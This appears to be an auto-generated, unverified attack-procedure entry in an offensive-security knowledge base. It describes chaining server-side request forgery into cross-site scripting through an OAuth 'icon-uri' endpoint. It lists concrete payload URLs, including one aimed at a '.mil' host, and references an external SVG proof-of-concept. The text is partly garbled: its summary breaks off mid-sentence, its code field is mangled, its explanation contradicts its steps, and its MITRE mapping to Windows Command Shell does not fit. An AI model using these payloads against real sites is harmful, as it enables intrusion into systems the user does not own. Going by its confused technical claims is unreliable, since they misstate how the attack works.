---
id: 0144e725-7755-49c3-877d-8ccef70ad88a
name: Server-Side Request Forgery to Cross-Site Scripting (SSRF to XSS) via Out-of-Band
  Output
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:38.107488+00:00'
updated_at: '2023-04-10T20:24:14.773907+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
sub_techniques:
- '[[Windows Command Shell|T1059.003 - Windows Command Shell]]'
tags:
- '[[Server-Side Request Forgery]]'
- '[[SSRF to XSS]]'
---

# Server-Side Request Forgery to Cross-Site Scripting (SSRF to XSS) via Out-of-Band Output

## Summary

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to force a server to send requests to other servers. This can be used to bypass firewalls or access services that are not directly accessible from the internet. In this procedure, an attacker uses SSRF to inject malicious

## Description

# Description

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to force a server to send requests to other servers. This can be used to bypass firewalls or access services that are not directly accessible from the internet. In this procedure, an attacker uses SSRF to inject malicious code into a website through a vulnerable parameter. The code is then executed in the victim's browser, leading to a Cross-Site Scripting (XSS) attack. This specific technique uses Out-of-Band (OOB) output to exfiltrate data from the victim's browser to the attacker's server.

## Requirements

1. Access to a vulnerable parameter that can be used for SSRF

1. Knowledge of the target's architecture and services

1. Ability to inject and execute malicious code in the victim's browser

## Defense

1. Implement input validation and sanitization to prevent SSRF vulnerabilities

1. Implement Content Security Policy (CSP) to prevent XSS attacks

1. Monitor network traffic for suspicious activity, such as OOB output

## Objectives

1. Inject malicious code into a vulnerable parameter of a website via SSRF

1. Execute the malicious code in the victim's browser via XSS

1. Exfiltrate data from the victim's browser to the attacker's server via OOB output

# Instructions

1. To execute this command, follow the steps below:
1. Use the first URL (http://brutelogic.com.br/poc.svg) to trigger a simple alert.
2. Use the second URL (https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=) to perform a simple SSRF.
3. Use the third URL (https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg) to trigger an Out-of-Band output.

**Code**: [[http://brutelogic.com.br/poc.svg -> simple alert
h]]

> In this command, we use a chain of SSRF vulnerabilities to gain an Out-of-Band output. The first URL is used to trigger a simple alert, which is a common technique to test for SSRF vulnerabilities. The second URL is used to perform a simple SSRF attack by injecting the first URL as a parameter value. Finally, the third URL is used to trigger an Out-of-Band output by injecting the second URL as a parameter value. This technique can be used to bypass network restrictions and gain access to sensitive data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]

### Sub-Techniques

- [[Windows Command Shell|T1059.003 - Windows Command Shell]]

## Tags

- [[Server-Side Request Forgery]]
- [[SSRF to XSS]]
